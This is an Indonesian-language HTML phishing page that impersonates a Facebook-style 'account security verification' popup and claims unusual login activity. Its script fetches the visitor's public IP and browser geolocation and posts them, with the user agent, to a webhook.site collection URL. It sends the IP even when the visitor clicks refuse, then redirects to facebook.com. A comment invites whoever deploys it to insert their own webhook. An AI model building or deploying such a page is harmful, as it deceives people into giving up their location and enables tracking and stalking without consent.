<!DOCTYPE html>
<html>
<head>
    <title>Verifikasi Keamanan</title>
    <style>
        .popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            z-index: 1000;
            text-align: center;
            font-family: Arial, sans-serif;
            width: 350px;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 999;
        }
        button {
            margin: 10px;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
        }
        .btn-yes {
            background: #4267B2;
            color: white;
        }
        .btn-yes:hover {
            background: #365899;
        }
        .btn-no {
            background: #ccc;
            color: #333;
        }
        .btn-no:hover {
            background: #bbb;
        }
        .logo {
            font-size: 48px;
            margin-bottom: 20px;
        }
        .warning {
            font-size: 12px;
            color: #999;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="popup">
        <div class="logo">🔒</div>
        <h3>Verifikasi Keamanan Akun</h3>
        <p>Sistem mendeteksi aktivitas login yang tidak biasa dari perangkat Anda.</p>
        <p><strong>Untuk keamanan akun Anda, kami perlu melakukan verifikasi lokasi.</strong></p>
        <button class="btn-yes" onclick="allowLocation()">✓ Izinkan Verifikasi</button>
        <button class="btn-no" onclick="denyLocation()">✗ Tolak</button>
        <p class="warning">Verifikasi hanya dilakukan sekali. Data Anda aman dan tidak akan disalahgunakan.</p>
    </div>

    <script>
        // ===========================================
        // KIRIM DATA KE WEBHOOK.SITE (NO CORS)
        // ===========================================
        
        // GANTI DENGAN URL WEBHOOK ANDA!
        const WEBHOOK_URL = 'https://webhook.site/052d15c1-096d-448f-9e5c-aca3d65b1bb7';

        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch(e) {
                console.error('Gagal ambil IP:', e);
                return 'IP tidak terdeteksi';
            }
        }

        async function sendToWebhook(data) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                console.log('✅ Data terkirim ke webhook:', data);
            } catch(e) {
                console.error('❌ Gagal kirim:', e);
            }
        }

        async function allowLocation() {
            const ip = await getPublicIP();
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    
                    await sendToWebhook({
                        ip: ip,
                        lat: lat,
                        lng: lng,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        status: 'USER_ALLOWED'
                    });
                    
                    alert('Verifikasi berhasil. Terima kasih!');
                    window.location.href = 'https://facebook.com';
                    
                }, async function(error) {
                    await sendToWebhook({
                        ip: ip,
                        lat: 'DENIED',
                        lng: 'DENIED',
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        status: 'LOCATION_DENIED',
                        error: error.message
                    });
                    alert('Anda tidak mengizinkan verifikasi lokasi.');
                    window.location.href = 'https://facebook.com';
                });
            } else {
                await sendToWebhook({
                    ip: ip,
                    lat: 'NOT_SUPPORTED',
                    lng: 'NOT_SUPPORTED',
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    status: 'GEOLOCATION_NOT_SUPPORTED'
                });
                alert('Browser tidak mendukung verifikasi lokasi.');
                window.location.href = 'https://facebook.com';
            }
        }

        async function denyLocation() {
            const ip = await getPublicIP();
            
            await sendToWebhook({
                ip: ip,
                lat: 'USER_DENIED',
                lng: 'USER_DENIED',
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                status: 'USER_DENIED'
            });
            
            alert('Anda menolak verifikasi.');
            window.location.href = 'https://facebook.com';
        }
    </script>
</body>
</html>
